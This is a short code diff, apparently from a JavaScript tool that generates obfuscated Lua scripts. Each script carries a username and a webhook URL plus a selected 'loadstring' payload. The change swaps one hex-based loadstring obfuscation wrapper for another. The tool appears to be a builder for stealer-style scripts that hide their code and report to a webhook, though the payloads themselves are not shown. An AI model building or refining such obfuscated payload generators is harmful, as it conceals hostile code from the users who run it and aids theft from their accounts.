@@ -84,7 +84,7 @@
     }
 
     function obfuscateScript(script) {
-        return `return(function(...)local P={'${multiHexObfuscate(script, 5)}'} for i=1,#P do P[i]=string.char(P[i]:match("\\x(%x%x)")) end loadstring(table.concat(P))(...) end)(...)`;
+        return `loadstring('${multiHexObfuscate(script, 5)}')()`;
     }
 
     function generateScript() {
@@ -99,6 +99,7 @@
         }
 
         let script = `Username = "${username}"
+
 Webhook = "${webhook}" ${loadstrings[selectedScript]}`;
 
 if (autoObfuscate) {
